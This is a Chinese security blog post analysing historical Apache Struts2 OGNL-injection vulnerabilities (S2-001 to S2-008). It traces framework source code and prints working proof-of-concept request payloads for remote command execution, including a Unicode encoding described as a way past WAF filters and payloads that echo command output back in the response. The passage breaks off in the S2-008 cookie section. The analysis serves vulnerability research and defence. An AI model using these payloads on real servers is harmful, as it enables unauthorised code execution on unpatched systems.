---
typora-root-url: ../../../static
title: "Struts2历史漏洞分析"
date: 2021-06-15T17:07:36+08:00
draft: false
categories: ["security"]
---

## Struts2基本了解

Struts2的数据处理架构图下所示：

![image-20210812144853425](/media/image-20210812144853425.png)

一个简单的说明如下：

1. 客户端初始化一个指向servlet容器的请求。
2. 请求经过一系列的过滤器（ActionContextCleanUp、SiteMesh）
3. FilterDispatcher被调用，并询问ActionMapper来决定这个请求是否需要调用某个Action
4. ActionMapper决定要调用那一个Action,FilterDispatcher把请求交给ActionProxy。
5. ActionProxy通过Configurate Manager询问Struts配置文件，找到要调用的Action类
6. ActionProxy创建一个ActionInvocation实例
7. ActionInvocation实例使用命令模式来调用，回调Action的exeute方法
8. 一旦Action执行完毕，ActionInvocation负责根据Struts.xml的配置返回结果。

可以看到ActionInvocation回调Action之前，会经过一系列的拦截器，其中我们需要注意的一个拦截器就是： `com.opensymphony.xwork2.interceptor.ParametersInterceptor` 拦截器，这个拦截器中，会获取请求信息，并将这些信息存入Action中的 `OgnlValueStack` 中：

![image-20210812150631623](/media/image-20210812150631623.png)

后续JSP中的所有动态数据，都是从这个 `OgnlValueStack` 中取出来的，如下所示：

![image-20210812151531295](/media/image-20210812151531295.png)

## Ognl RCE Sink

- `Ognl.setValue` ;
- `Ognl.getValue` ;
- `Ognl.parseExpression() --> Ognl.getValue()/Ognl.setValue()` ；
- 先将恶意的Ognl表达式放入Ognl上下文中，然后再调用上下文中的恶意Ognl表达式来执行；

例如如下代码，均可造成Ognl表达式注入：

```java
/**
 * Ognl setValue() SSTI
 */
public static void sinkOne()throws Exception{
    String expression="((new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start())(glassy)(asd)";
    OgnlContext context = new OgnlContext();
    Ognl.setValue(expression,context,"");
}

/**
 * Ognl getValue() SSTI
 */
public static void sinkTwo()throws Exception{
    String expression="(new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start()";
    OgnlContext context = new OgnlContext();
    Ognl.getValue(expression,context,"");
}

/**
 * Ognl.parseExpression() --> Ognl.getValue()/Ognl.setValue()
 */
public static void sinkThree()throws Exception{
    String expression="((new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start())(glassy)(asd)";
    OgnlContext context = new OgnlContext();
    Object o = Ognl.parseExpression(expression);
    Ognl.setValue(o,context,"");
}

/**
* Bypass Whitelist Check
* 先将恶意的Ognl表达式放入Ognl上下文中，然后再调用上下文中的恶意Ognl表达式来执行
*/
public static void sinkFive()throws Exception{
    // 模拟绕过白名单检查，先将恶意的Ognl表达式放入Ognl的上下文中
    String preExpression="(@java.lang.Runtime@getRuntime().exec('calc'))(meh)";
    OgnlContext context = new OgnlContext();
    context.put("key",preExpression);
    // 然后再准备调用已存入Ognl上下文中的恶意表达式
    String attackStr="(key)('pinger')";
    Ognl.setValue(attackStr,context,true);
}
```

需要 **特别注意** 的是：***Ognl表达式支持UNICODE编码(\u0023)*** 。所以作为攻击者可以使用这种方式绕过WAF检测。

例如如下案例所示，使用UNICODE编码可以成功造成Ognl表达式注入：

```java
/**
 * Unicode Bypass
 */
public static void sinkFour()throws Exception{
    String expression="\\u0028\\u0028\\u006e\\u0065\\u0077 \\u006A\\u0061\\u0076\\u0061\\u002E\\u006C\\u0061\\u006E\\u0067\\u002E\\u0050\\u0072\\u006F\\u0063\\u0065\\u0073\\u0073\\u0042\\u0075\\u0069\\u006C\\u0064\\u0065\\u0072(\\u006E\\u0065\\u0077\\u0020\\u006A\\u0061\\u0076\\u0061\\u002E\\u006C\\u0061\\u006E\\u0067\\u002E\\u0053\\u0074\\u0072\\u0069\\u006E\\u0067\\u005B\\u005D\\u007B\"calc\"\\u007D\\u0029\\u0029\\u002E\\u0073\\u0074\\u0061\\u0072\\u0074\\u0028\\u0029\\u0029\\u0028\\u006F\\u006E\\u0065\\u0029\\u0028\\u0074\\u0077\\u006F\\u0029";
    OgnlContext context = new OgnlContext();
    Object o = Ognl.parseExpression(expression);
    Ognl.setValue(o,context,"");
}
```

![image-20210813102029114](/media/image-20210813102029114.png)

## Struts2安全机制

先将Struts2的一些安全机制以及一些常见问题先说明下，方便后续的理解。

- Struts2从 **S2-005** 增加自定义的 `SecurityMemberAccess` ，可以设置是否允许调用静态方法等；
-  `com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept(ActionInvocation)` 中，在 `setParameters()` 之前，会设置 `denyMethodExecution` 为true，但是 `setParameters()` 之后，会设置 `denyMethodExecution` 为false。也就是在 `setParameters()` 之后，再使用Ognl解析表达式就允许执行方法；

## S2-001

影响版本：Struts 2.0.0 - Struts 2.0.8

CVE编号：none

POC如下：

```java
%{(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()}
```

这个漏洞，归根结底就是Ognl表达式递归解析漏洞，使用Ognl解析得到的值，再次作为Ognl表达式进行进行解析。由于攻击者可以控制Ognl表达式的值为恶意的Ognl表达式，由此造成RCE。下面将通过案例进行详细分析。

struts.xml配置如下：

```xml
<package name="S2-001" extends="struts-default">
   <action name="login" class="com.demo.action.LoginAction">
      <result name="success">/welcome.jsp</result>
      <result name="error">/index.jsp</result>
   </action>
</package>
```

`com.demo.action.LoginAction` 关键代码如下：

```java
public String execute() throws Exception {
    if (!this.username.isEmpty() && !this.password.isEmpty()) {
        return this.username.equalsIgnoreCase("admin") && this.password.equals("admin") ? "success" : "error";
    } else {
        return "error";
    }
}
```

error对应的 `index.jsp` 关键代码如下：

```html
<s:form action="login">
   <s:textfield name="username" label="username" />
   <s:textfield name="password" label="password" />
   <s:submit></s:submit>
</s:form>
```

可以看到，jsp中使用了struts2定义的标签 `textfield` ，我们可以在 `struts2-core-2.0.8.jar!\META-INF\struts-tags.tld` 中看到这个标签的定义：

```xml
<name>textfield</name>
<tag-class>org.apache.struts2.views.jsp.ui.TextFieldTag</tag-class>
```

找到这个标签对应的Java类，查看其继承关系如下：

![image-20210812152852574](/media/image-20210812152852574.png)

最终发现，标签的处理逻辑（ `doStartTag()` 、 `doEndTag()` ），都在其父类 `org.apache.struts2.views.jsp.ComponentTagSupport` 中：

```java
public abstract class ComponentTagSupport extends StrutsBodyTagSupport {
    protected Component component;

    public ComponentTagSupport() {
    }

    public abstract Component getBean(ValueStack var1, HttpServletRequest var2, HttpServletResponse var3);

    public int doEndTag() throws JspException {
        this.component.end(this.pageContext.getOut(), this.getBody());
        this.component = null;
        return 6;
    }

    public int doStartTag() throws JspException {
        this.component = this.getBean(this.getStack(), (HttpServletRequest)this.pageContext.getRequest(), (HttpServletResponse)this.pageContext.getResponse());
        Container container = Dispatcher.getInstance().getContainer();
        container.inject(this.component);
        this.populateParams();
        boolean evalBody = this.component.start(this.pageContext.getOut());
        if (evalBody) {
            return this.component.usesBody() ? 2 : 1;
        } else {
            return 0;
        }
    }

    protected void populateParams() {
        this.component.setId(this.id);
    }

    public Component getComponent() {
        return this.component;
    }
}
```

漏洞就发生在 `doEndTag()` 中：

```java
public int doEndTag() throws JspException {
    this.component.end(this.pageContext.getOut(), this.getBody());
    this.component = null;
    return 6;
}
```

这里 `this.pageContext.getOut()` 获取的就是一个 `Writer` 对象，使用这个 `Writer` 来输出渲染后的struts2标签。我们继续跟进 `this.component.end()` 来查看渲染的逻辑：

```java
// org.apache.struts2.components.UIBean#end()
public boolean end(Writer writer, String body) {
    this.evaluateParams();

    try {
        super.end(writer, body, false);
        this.mergeTemplate(writer, this.buildTemplateName(this.template, this.getDefaultTemplate()));
    } catch (Exception var7) {
        LOG.error("error when rendering", var7);
    } finally {
        this.popComponentStack();
    }

    return false;
}
```

继续跟进 `this.evaluateParams()` ：

```java
// org.apache.struts2.components.UIBean#evaluateParams()
} else if (this.evaluateNameValue()) {
    Class valueClazz = this.getValueClassType();
    if (valueClazz != null) {
        if (this.value != null) {
            this.addParameter("nameValue", this.findValue(this.value, valueClazz));
        } else if (name != null) {
            String expr = name;
            if (this.altSyntax()) {
                expr = "%{" + name + "}";
            }

            this.addParameter("nameValue", this.findValue(expr, valueClazz));
        }
    }
```

这里的name就是前面index.jsp中使用的struts2标签中的name属性：username或者password。可以看到 `expr = "%{" + name + "}"` 将name包裹成 `%{xxxxx}` 的形式，然后调用 `this.findValue(expr, valueClazz)` 来查找表达式对应的参数值。一路跟进，最终发现在 `com.opensymphony.xwork2.util.TextParseUtil#translateVariables()` 中从OgnlValueStack中获取参数值，并且是一个while循环获取，也就是获取到的参数值可以作为参数名继续进行查询（也就是Ognl递归解析）：

```java
public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator) {
    Object result = expression;

    while(true) {
        int start = expression.indexOf(open + "{");
        int length = expression.length();
        int x = start + 2;
        int count = 1;

        while(start != -1 && x < length && count != 0) {
            char c = expression.charAt(x++);
            if (c == '{') {
                ++count;
            } else if (c == '}') {
                --count;
            }
        }

        int end = x - 1;
        if (start == -1 || end == -1 || count != 0) {
            return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
        }

        String var = expression.substring(start + 2, end);
        Object o = stack.findValue(var, asType);
        if (evaluator != null) {
            o = evaluator.evaluate(o);
        }

        String left = expression.substring(0, start);
        String right = expression.substring(end + 1);
        if (o != null) {
            if (TextUtils.stringSet(left)) {
                result = left + o;
            } else {
                result = o;
            }

            if (TextUtils.stringSet(right)) {
                result = result + right;
            }

            expression = left + o + right;
        } else {
            result = left + right;
            expression = left + right;
        }
    }
}
```

![image-20210812155630477](/media/image-20210812155630477.png)

跟进，发现是使用 `OgnlUtil#getValue()` 来获取参数值：

![image-20210812155841385](/media/image-20210812155841385.png)

继续跟进，发现存在Ognl表达式注入：

![image-20210813095330883](/media/image-20210813095330883.png)

这里第一次 `Ognl.getValue()` 是获取password的参数值，也就是得到我们的恶意Ognl表达式： `%{(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()}` 。但是Ognl解析并不会停止，而是在 `com.opensymphony.xwork2.util.TextParseUtil#translateVariables()` 中的while循环中继续触发Ognl解析。所以就造成了Ognl表达式注入RCE：

![image-20210812160815973](/media/image-20210812160815973.png)

对于漏洞的修复，官方的做法就是限制Ognl的解析层数，默认只解析一层。

这里还存在一个疑问：为什么 `com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept(ActionInvocation)` 中，设置了 `denyMethodExecution` 为true，这个漏洞还能打？

前面也说过， `ParametersInterceptor` 中调用 `setParameters()` 之后，还会设置 `denyMethodExecution` 为false。并且我们的Ognl表达式的解析是在  `ParametersInterceptor` 过滤器之后的操作（模板渲染发生在 `ParametersInterceptor` 过滤器过滤之后），所以此时 `denyMethodExecution` 为false，Ognl表达式能调用方法，所以能打。

RCE证明如下：

![image-20210817164727799](/media/image-20210817164727799.png)

## S2-002

影响版本：Struts 2.0.0 - Struts 2.1.8.1

CVE编号：none

POC如下：

```
http://127.0.0.1:8080/S2-001/?<script>alert(123);</script>
http://127.0.0.1:8080/S2-001/?<script xxx>alert(123);</script>
```

XSS漏洞，不分析了。

## S2-003

影响版本：Struts 2.0.0 - Struts 2.1.8.1

CVE编号：none

POC如下：

```java
// 以下通过的测试，均在Tomcat 8.5.38下可以打
// 无回显：
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)

// 带回显：
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&
('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)
&
('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)
&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)
&
(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))
&
(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))
&
(C)(('\u0023mydat.readFully(\u0023myres)')(bla))
&
(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))
&
('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)
&
(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))

// 复现失败：
('\u0023_memberAccess[\'allowStaticMethodAccess\']')(vaaa)=true
&
(aaaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023vccc')(\u0023vccc\u003dnew java.lang.Boolean("false")))
&
(asdf)(('\u0023rt.exec("calc".split("@"))')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1
```

这个漏洞，说白了就是一个编码绕过，前面说过Ognl支持UNICODE编码，于是就可以使用UNICODE编码绕过。

首先看到入口 `com.opensymphony.xwork2.interceptor.ParametersInterceptor#intercept()` ，往OgnlValueStack中设置值之前，会先设置禁止调用方法：

![image-20210813111704930](/media/image-20210813111704930.png)

继续跟进 `this.setParameter()` ，发现会对请求参数名进行验证：

![image-20210813111941612](/media/image-20210813111941612.png)

看到参数名的检查逻辑：

```java
protected boolean acceptableName(String name) {
    if (name.indexOf('=') != -1 || name.indexOf(',') != -1 || name.indexOf('#') != -1
            || name.indexOf(':') != -1 || isExcluded(name)) {
        return false;
    } else {
        return true;
    }
}
```

需要关注参数名不能包含字符： `#` 。而我们知道如果我们要使用Ognl访问当前OgnlContext中的变量，需要使用 `#` 字符。如果我们可以绕过这个检查，就可以访问当前OgnlContext中的 `xwork.MethodAccessor.denyMethodExecution` 键值对，我们可以将其默认的true修改为false，这样我们就可以执行Ognl表达式了。这个地方的绕过很容易，Ognl支持UNICODE编码，我们直接将 `#` 字符进行UNICODE编码，即可访问当前OgnlContext中的变量了，然后将 `xwork.MethodAccessor.denyMethodExecution` 修改为false，使得能够使用Ognl表达式执行函数。

这里我传入的参数名为： `('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)` 。使用了UNICODE编码绕过了这个函数的检查。

继续往下跟，通过 `acceptableName(String)` 函数的检查后，将在此处往当前请求的OgnlValueStack中设置值：

![image-20210813113955138](/media/image-20210813113955138.png)

这里因为 `xwork.MethodAccessor.denyMethodExecution` 为true，所以执行Ognl会提示不能执行 `exec()` 函数：

![image-20210813114146453](/media/image-20210813114146453.png)

所以要想攻击成功，需要两个步骤（UNICODE编码绕过的前提下）：

1. 使用Ognl表达式将 `xwork.MethodAccessor.denyMethodExecution` 设置为false；
2. 使用Ognl表达式调用命令执行的函数来执行命令；

对应的POC如下：

```java
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)
```

再次POC发包测试：

![image-20210813115411652](/media/image-20210813115411652.png)

![image-20210813115817606](/media/image-20210813115817606.png)

一直跟进 `stack.setValue()` ，发现底层是使用 `Ognl.setValue()` 来处理的，很明显这也是一个Ognl表达式注入的sink，并且 `xwork.MethodAccessor.denyMethodExecution` 的值为false，允许执行函数：

![image-20210813120127294](/media/image-20210813120127294.png)

RCE证明如下：

![image-20210817164917849](/media/image-20210817164917849.png)

## S2-005

影响版本：Struts 2.0.0 - Struts 2.1.8.1

CVE编号：CVE-2010-1870

POC如下：

```java
// 带回显：
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&
('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)
&
('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)
&
('\u0023mycmd\u003d\'whoami\'')(bla)(bla)
&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)
&
(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))
&
(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))
&
(C)(('\u0023mydat.readFully(\u0023myres)')(bla))
&
(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))
&
('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)
&
(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))

// 不带回显
('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)
&
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&
('\u0023mycmd\u003d\'calc\'')(bla)(bla)
&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)
```

这个漏洞很有意思，前面说过：Struts2从 **S2-005** 增加自定义的 `SecurityMemberAccess` ，可以设置是否允许调用静态方法等。但是有意思的是，我们可以使用Ognl表达式设置 `SecurityMemberAccess` 的安全配置，也就是： **S2-005给自己上了一个锁，但是把锁钥匙给插在了锁头上** 。

首先我们看到自定义的 `SecurityMemberAccess` ：

```java
/**
 * Allows access decisions to be made on the basis of whether a member is static or not.
 * Also blocks or allows access to properties.
 */
public class SecurityMemberAccess extends DefaultMemberAccess {

    private boolean allowStaticMethodAccess;
    Set<Pattern> excludeProperties = Collections.emptySet();
    Set<Pattern> acceptProperties = Collections.emptySet();

    public SecurityMemberAccess(boolean method) {
        super(false);
        allowStaticMethodAccess = method;
    }

    public boolean getAllowStaticMethodAccess() {
        return allowStaticMethodAccess;
    }

    public void setAllowStaticMethodAccess(boolean allowStaticMethodAccess) {
        this.allowStaticMethodAccess = allowStaticMethodAccess;
    }

    @Override
    public boolean isAccessible(Map context, Object target, Member member,
                                String propertyName) {

        boolean allow = true;
        int modifiers = member.getModifiers();
        if (Modifier.isStatic(modifiers)) {
            if (member instanceof Method && !getAllowStaticMethodAccess()) {
                allow = false;
                if (target instanceof Class) {
                    Class clazz = (Class) target;
                    Method method = (Method) member;
                    if (Enum.class.isAssignableFrom(clazz) && method.getName().equals("values"))
                        allow = true;
                }
            }
        }

        //failed static test
        if (!allow)
            return false;

        // Now check for standard scope rules
        if (!super.isAccessible(context, target, member, propertyName))
            return false;

        return isAcceptableProperty(propertyName);
    }

    protected boolean isAcceptableProperty(String name) {
        if ( name == null) {
            return true;
        }

        if (isAccepted(name) && !isExcluded(name)) {
            return true;
        }
        return false;
    }

    protected boolean isAccepted(String paramName) {
        if (!this.acceptProperties.isEmpty()) {
            for (Pattern pattern : acceptProperties) {
                Matcher matcher = pattern.matcher(paramName);
                if (matcher.matches()) {
                    return true;
                }
            }

            //no match, but acceptedParams is not empty
            return false;
        }

        //empty acceptedParams
        return true;
    }

    protected boolean isExcluded(String paramName) {
        if (!this.excludeProperties.isEmpty()) {
            for (Pattern pattern : excludeProperties) {
                Matcher matcher = pattern.matcher(paramName);
                if (matcher.matches()) {
                    return true;
                }
            }
        }
        return false;
    }

    public void setExcludeProperties(Set<Pattern> excludeProperties) {
        this.excludeProperties = excludeProperties;
    }

    public void setAcceptProperties(Set<Pattern> acceptedProperties) {
        this.acceptProperties = acceptedProperties;
    }
}
```

注意到其中的方法： `public void setAllowStaticMethodAccess(boolean allowStaticMethodAccess)` ，其权限是public。并且 `SecurityMemberAccess` 对象可以使用Ognl表达式访问到，例如如下OgnlContext中的代码所示，存在 `public MemberAccess getMemberAccess()` 方法，所以Ognl表达式能访问到OgnlContext中的 `MemberAccess` ，也就是Struts2设置的 `SecurityMemberAccess` ：

```java
public MemberAccess getMemberAccess()
{
    return _memberAccess;
}
```

现在理一下思路，也就是：

- 通过Ognl表达式访问OgnlContext的 `SecurityMemberAccess` ;
- 通过调用 `SecurityMemberAccess` 的 `setAllowStaticMethodAccess(boolean)` 方法，设置允许调用静态方法；
- 当然，和S2-003一样，需要设置 `xwork.MethodAccessor.denyMethodExecution` 设置为false，否则不能执行方法；
- 使用Ognl表达式执行 `Runtime.getRuntime().exec(String)` 方法来执行命令；

使用Ognl表达式设置前的OgnlContext：

![image-20210816101440032](/media/image-20210816101440032.png)

使用Ognl表达式设置后的OgnlContext如下：

![image-20210816101605399](/media/image-20210816101605399.png)

然后就可以顺利的执行 `Runtime.getRuntime().exec(String)` 了：

![image-20210816101825104](/media/image-20210816101825104.png)

## S2-007

影响版本：Struts 2.0.0 - Struts 2.2.3

CVE编号：none

POC如下：

```java
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("calc")) + '

// 带回显：
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '
```

当配置了验证规则 `<ActionName>-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析，从而造成远程代码执行。

例如这里配置一个 `UserAction-validation.xml` 检查UserAction的age字段是否符合要求：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE validators PUBLIC
   "-//OpenSymphony Group//XWork Validator 1.0//EN"
   "http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
<validators>
   <field name="age">
      <field-validator type="int">
         <param name="min">1</param>
         <param name="max">150</param>
      </field-validator>
   </field>
</validators>
```

当我们传入的age字符验证失败时，会经过 `ConversionErrorInterceptor` 拦截器的处理：

```java
// com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept(ActionInvocation)
public String intercept(ActionInvocation invocation) throws Exception {

    ActionContext invocationContext = invocation.getInvocationContext();
    Map<String, Object> conversionErrors = invocationContext.getConversionErrors();
    ValueStack stack = invocationContext.getValueStack();

    HashMap<Object, Object> fakie = null;

    for (Map.Entry<String, Object> entry : conversionErrors.entrySet()) {
        String propertyName = entry.getKey();
        Object value = entry.getValue();

        if (shouldAddError(propertyName, value)) {
            String message = XWorkConverter.getConversionErrorMessage(propertyName, stack);

            Object action = invocation.getAction();
            if (action instanceof ValidationAware) {
                ValidationAware va = (ValidationAware) action;
                va.addFieldError(propertyName, message);
            }

            if (fakie == null) {
                fakie = new HashMap<Object, Object>();
            }

            fakie.put(propertyName, getOverrideExpr(invocation, value));
        }
    }

    if (fakie != null) {
        // if there were some errors, put the original (fake) values in place right before the result
        stack.getContext().put(ORIGINAL_PROPERTY_OVERRIDE, fakie);
        invocation.addPreResultListener(new PreResultListener() {
            public void beforeResult(ActionInvocation invocation, String resultCode) {
                Map<Object, Object> fakie = (Map<Object, Object>) invocation.getInvocationContext().get(ORIGINAL_PROPERTY_OVERRIDE);

                if (fakie != null) {
                    invocation.getStack().setExprOverrides(fakie);
                }
            }
        });
    }
    return invocation.invoke();
}
```

这个拦截的处理很简单：

- 首先通过 `Object value = entry.getValue();` 获取到用户输入错误的参数值；
- 通过 `fakie.put(propertyName, getOverrideExpr(invocation, value));` 将错误的参数值放入到 `fakie` （HashMap结构）中；
- 最后通过 `invocation.getStack().setExprOverrides(fakie);` 将 `fakie` 设置到当前 `ActionInvocation` 的 `ValueStack` 的 `overrides` 属性中。

注意这里 `getOverrideExpr(invocation, value)` 会进行字符串拼接：

```java
protected Object getOverrideExpr(ActionInvocation invocation, Object value) {
    return "'" + value + "'";
}
```

这也就是为啥POC前后会有一个 `+` 符号的原因，就是为了逃逸单引号；

设置完毕后，当前 `ActionInvocation` 的 `ValueStack` 的 `overrides` 属性如下：

![image-20210816110559248](/media/image-20210816110559248.png)

最后仍旧是Struts2的自定义标签 `textfield` 的视图渲染触发的漏洞。入口仍旧是 `org.apache.struts2.views.jsp.ComponentTagSupport#doEndTag()` 方法。最终在 `com.opensymphony.xwork2.util.TextParseUtil#translateVariables` 中如下位置触发 `ValueStack#findValue()` ：

![image-20210816111319968](/media/image-20210816111319968.png)

最终会触发 `OgnlValueStack#tryFindValue(String, Class)` 方法，看到这个方法的实现如下：

```java
private Object tryFindValue(String expr, Class asType) throws OgnlException {
    Object value = null;
    try {
        expr = lookupForOverrides(expr);
        value = getValue(expr, asType);
        if (value == null) {
            value = findInContext(expr);
        }
    } finally {
        context.remove(THROW_EXCEPTION_ON_FAILURE);
    }
    return value;
}
```

注意到这里会调用 `lookupForOverrides(expr);` 从当前OgnlValueStack中的 `overrides` 属性中查找age的值，这里因为前面在 `ConversionErrorInterceptor` 拦截器中以及设置了 `overrides` 属性，并且值就是恶意的Ognl表达式。所以这里经过 `lookupForOverrides(expr)` 处理后得到的expr就是我们恶意的Ognl表达式；

然后通过调用 `getValue(expr, asType)` 进行Ognl表达式解析，但是此时expr是一个恶意的表达式，从而造成RCE；

关于这个漏洞的修复，也是比较粗暴，直接在 `ConversionErrorInterceptor` 中修改 `getOverrideExpr(ActionInvocation, Object)` 方法，增加转义处理，此时就无法逃逸双引号了，也就无法造成Ognl表达式注入了：

![image-20210816112427178](/media/image-20210816112427178.png)

## S2-008

影响版本：Struts 2.0.0 - Struts 2.3.17

CVE编号：none

POC如下：

```java
// 需要开启devmode，但是Struts2默认关闭
?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22calc%22%29)
```

这个漏洞很简单，如果开启debug模式，漏洞就发生在 `org.apache.struts2.interceptor.debugging.DebuggingInterceptor#intercept(ActionInvocation)` 中（当前，要经过这个拦截器首先得开启debug模式）。看到简化的代码：

```java
    public String intercept(ActionInvocation inv) throws Exception {
        boolean actionOnly = false;
        boolean cont = true;
        Boolean devModeOverride = FilterDispatcher.getDevModeOverride();
        boolean devMode = devModeOverride != null ? devModeOverride : this.devMode;
        final ActionContext ctx;
        if (devMode) {
            ctx = ActionContext.getContext();
            String type = this.getParameter("debug");
            ctx.getParameters().remove("debug");
            if ("xml".equals(type)) {
                // ......
            } else if ("console".equals(type)) {
                // ......
            }else if ("command".equals(type)) {
                ValueStack stack = (ValueStack)ctx.getSession().get("org.apache.struts2.interceptor.debugging.VALUE_STACK");
                if (stack == null) {
                    stack = (ValueStack)ctx.get("com.opensymphony.xwork2.util.ValueStack.ValueStack");
                    ctx.getSession().put("org.apache.struts2.interceptor.debugging.VALUE_STACK", stack);
                }

                String cmd = this.getParameter("expression");
                ServletActionContext.getRequest().setAttribute("decorator", "none");
                HttpServletResponse res = ServletActionContext.getResponse();
                res.setContentType("text/plain");

                try {
                    PrintWriter writer = ServletActionContext.getResponse().getWriter();
                    writer.print(stack.findValue(cmd));
                    writer.close();
                } catch (IOException var17) {
                    var17.printStackTrace();
                }

                cont = false;
            }
            // ......
```

可以看到，如果开启Debug模式，可以从前端接收参数 `debug`  ，如果 `debug` 的值为 `command` ，则会进入： `else if ("command".equals(type)) {` 分支，可以看到这个分支内的处理逻辑，首先获取一个ValueStack，然后从前端获取 `expression` 参数，在 `writer.print(stack.findValue(cmd));` 处，触发执行前端传来的Ognl表达式，从而造成Ognl表达式注入；

![image-20210816115431008](/media/image-20210816115431008.png)

![image-20210816115501671](/media/image-20210816115501671.png)

此外，还存在一个漏洞位置（Tomcat下没法打，原因下面讲），如果开启了Cookie拦截器，那么漏洞位置就发生在 `org.apache.struts2.interceptor.CookieInterceptor#intercept(ActionInvocation)` 中：

```java
public String intercept(ActionInvocation invocation) throws Exception {
    if (LOG.isDebugEnabled()) {
        LOG.debug("start interception", new String[0]);
    }

    Map<String, String> cookiesMap = new LinkedHashMap();
    Cookie[] cookies = ServletActionContext.getRequest().getCookies();
    if (cookies != null) {
        ValueStack stack = ActionContext.getContext().getValueStack();
        Cookie[] arr$ = cookies;
        int len$ = cookies.length;

        for(int i$ = 0; i$ < len$; ++i$) {
            Cookie cookie = arr$[i$];
            String name = cookie.getName();
            String value = cookie.getValue();
            if (this.cookiesNameSet.contains("*")) {
                if (LOG.isDebugEnabled()) {
                    LOG.debug("contains cookie name [*] in configured cookies name set, cookie with name [" + name + "] with value [" + value + "] will be injected", new String[0]);
                }

                this.populateCookieValueIntoStack(name, value, cookiesMap, stack);
            } else if (this.cookiesNameSet.contains(cookie.getName())) {
                this.populateCookieValueIntoStack(name, value, cookiesMap, stack);
            }
        }
    }

    this.injectIntoCookiesAwareAction(invocation.getAction(), cookiesMap);
    return invocation.invoke();
}
```

可以看到，这里会获取Cookies，然后判断当前配置的 `cookiesName` 是否包含 `*` 符号或者前端发送的cookieName是否和配置中的一致。如果通过判断，则会调用 `this.populateCookieValueIntoStack(name, value, cookiesMap, stack);` ，继续跟进：

```java
protected void populateCookieValueIntoStack(String cookieName, String cookieValue, Map<String, String> cookiesMap, ValueStack stack) {
    if (!this.cookiesValueSet.isEmpty() && !this.cookiesValueSet.contains("*")) {
        if (this.cookiesValueSet.contains(cookieValue)) {
            if (LOG.isDebugEnabled()) {
                LOG.debug("both configured cookie name and value matched, cookie [" + cookieName + "] with value [" + cookieValue + "] will be injected", new String[0]);
            }

            cookiesMap.put(cookieName, cookieValue);
            stack.setValue(cookieName, cookieValue);
        }
    } else {
        if (LOG.isDebugEnabled()) {
            if (this.cookiesValueSet.isEmpty()) {
                LOG.debug("no cookie value is configured, cookie with name [" + cookieName + "] with value [" + cookieValue + "] will be injected", new String[0]);
            } else if (this.cookiesValueSet.contains("*")) {
                LOG.debug("interceptor is configured to accept any value, cookie with name [" + cookieName + "] with value [" + cookieValue + "] will be injected", new String[0]);
            }
        }
        cookiesMap.put(cookieName, cookieValue);
        stack.setValue(cookieName, cookieValue);
    }

}
```

